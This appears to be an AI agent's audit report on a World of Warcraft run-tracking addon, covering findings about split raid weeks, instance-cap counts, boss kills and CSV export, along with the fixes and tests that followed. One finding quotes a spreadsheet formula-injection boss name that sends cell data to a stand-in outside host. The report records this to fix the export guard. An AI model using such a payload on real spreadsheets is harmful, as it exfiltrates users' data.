# IL3 audit cycle 7 (fresh agent, recorded before fixes)
Scope: README, TOC, il3 plan/cycles 1-6; Run, Track, Sync, Data, History, UI, Export, Commands,
Util read in full (Run 1-1236 and Track 150-680 line by line for the cycle 6 ghost fix);
tests_il3/il2/il1/sync/tests/il2_duo/il1_duo green; fuzz2 701-703, fuzz_duo 701-702 x3 modes,
fuzz_copy with unseen resets 701-745 (events, marks) and 702-715 (anon); probes p1-p7 in
/tmp/claude-0/il3_c7/ (p1: both wipe, reset, either one back first - the ghost fix holds in a duo).
Not reached: real client (whether a ghost zoning in fires any kill event, whether a saved raid ID
counts toward the instance cap, delivery during loading screens, throttle), real spreadsheet.
Anon-mode fuzz_copy failures are the documented "only named kills" limit; the other unseen-reset
failures are /runbook new or a boss that never died twice (documented), except seed 701 (item 5).
Note: ns.SplitPointFor (Run:175) is never called; the paths inline their own choice (item 4).
Counts: critical 0, major 1, minor 5 (all confirmed by repro).
1. major Run.lua:404-410/329-331/622 + Data.lua:1037-1039 - a raid week split over two nights:
   night 2 enters the same raid ID (first bosses dead) after the 2-hour copy window, so it's a
   fresh, not-late run. Its clear (Garr, Ragnaros: 32:00) prints "New best clear (-1:38:00)", is the
   Dungeons tab best (#4) and drags the average from 2:10:00 to 1:37:20; splits vs best vanish (the
   best run's kill 1 is Garr). It also adds a cap entry. No warning; README says runs that began
   where bosses had died don't count. (p2)
2. minor Run.lua:1103-1104 + 622 + 409 - you're outside alive 30+ minutes while your partner waits
   inside the same copy: your run ends ("away 30+ min"), and going back in starts a new run that
   adds an instance-cap entry (README: "coming back into the same copy doesn't count again") and is
   not late: its 3-boss "clear" (8:02) became "New best clear (-19:32)". Mirel's log, still in that
   run, shows it was the same copy. (p3)
3. minor Track.lua:654-666 vs Run.lua:726 - /runbook unboss of a mistaken hand mark that split the
   run (a boss named twice after a repair trip) takes the kill back but not the cap entry the split
   added: "Instances 2/5" for one instance, for the next hour. (Unboss does undo the entry of a
   NewCopyHere mark.) (p4)
4. minor Track.lua:372-373/533-535 + Sync.lua:606-609 - a repair trip (alive return R), then a
   wipe and ghost return G; the copy was reset during the wipe. Rhahk'Zor (killed before R) dies
   again: the split is at R, not G (README Limits: "where you last came back in"). Sneed from the
   old copy (between R and G) moves into the new run at 2:20, the old run loses it, the new run's
   time includes the old-copy stretch, and the new copy's Sneed kill is then dropped silently as
   "the same kill" (the new run has no return point). (p6)
5. minor Track.lua:390-408 - a boss that died in an earlier run of this copy (/runbook end, back in)
   is killed again by your partner in a new copy you were both in, while you're outside: the
   copy-kill path only splits when you're inside, and Mirel's P message is ignored outside. Your run
   keeps Sneed (copy 1) and Rhahk'Zor (copy 2); Mirel's log split; nothing tells you. (The same
   with the boss in this run's own kills does split, at Track:374.) (p7; fuzz_copy 701 events)
6. minor Export.lua:65 - CSV formula guard skips "-<digit>": a partner's boss name
   `-1+WEBSERVICE("http://x.example/?"&A1)` (untimed, so nothing follows it) is exported as that
   exact cell, which a spreadsheet runs as a formula. Needs a hostile partner (or a stranger
   auto-paired in a two-person group). (p5)

## Fixes (after the audit was recorded)

1. (major) A run that ends by timing out is now remembered as a copy you may go back into. A raid
   with bosses down stays known until the weekly reset the game reports
   (`C_DateAndTime.GetSecondsUntilWeeklyReset`, read with pcall, secret-safe, 0-8 days). Night 2 of
   a raid week takes the saved copy: late run (not a best or average clear), no new cap entry.
   Without that API the old 2-hour window applies; README Limits says so.
2. (minor) A copy your partner was in stays known for up to 6 hours after you left it. When their
   status message shows they're still in a run of theirs from that copy, your current run is in it
   too (`ns.PartnerKeptCopy`, `ns.RejoinCopy`): marked late, its cap entry taken back, and a chat
   line says why. A run of theirs you weren't in doesn't match.
3. (minor) A split made by your own repeat kill or mark keeps that kill as `entryBy`, so
   `/runbook unboss` takes back the cap entry the new run added.
4. (minor) Kept the alive-return-first split point. It is documented now, and an IL1 test needs
   it: a reset while you're dead with your corpse inside is the less likely case. The real harm was
   that the later ghost return was lost. Now a split keeps the visit numbers in the new run and
   carries any later return (ghost or alive) into it. Another boss killed twice then splits again
   at the ghost return, instead of being dropped as "the same kill". README rows reworded to say
   which return is used.
5. (minor) His repeat kill of a boss from an earlier run of this copy, while you're outside after
   being in the new copy with him, splits your run at your last return (as the run's own kills
   already did).
6. (minor) The CSV guard quotes any cell starting with "-" unless it's a plain number.

Tests: tests_il3.lua "Audit cycle 7" (a raid week with and without the API, after the weekly
reset, unboss cap, CSV, repair trip then ghost return with a note), plus a new tests_il3_duo.lua
(partner stayed inside; he left too and went in first; his copy kill while you're outside). The
mock client has `C_DateAndTime.GetSecondsUntilWeeklyReset`. 14 new mutations, all caught. The
3 cycle 6 snippets were updated to the new code. run.sh green (exit 0) after these fixes.

## IL3 status
Seven audit cycles in a row after the improvement step, and none came back clean.

| Cycle | 1 | 2 | 3 | 4 | 5 | 6 | 7 |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Findings | 4 | 1 | 1 | 2 | 3 | 1 | 6 |

All were minor except cycle 7's #1 (major: a split raid week made a false best clear). Stopped at the
same 7-cycle cap as IL1 and IL2: not converging. Every finding was fixed, tested and checked with a
mutation. Cycle 7's fixes have not been seen by a fresh audit.
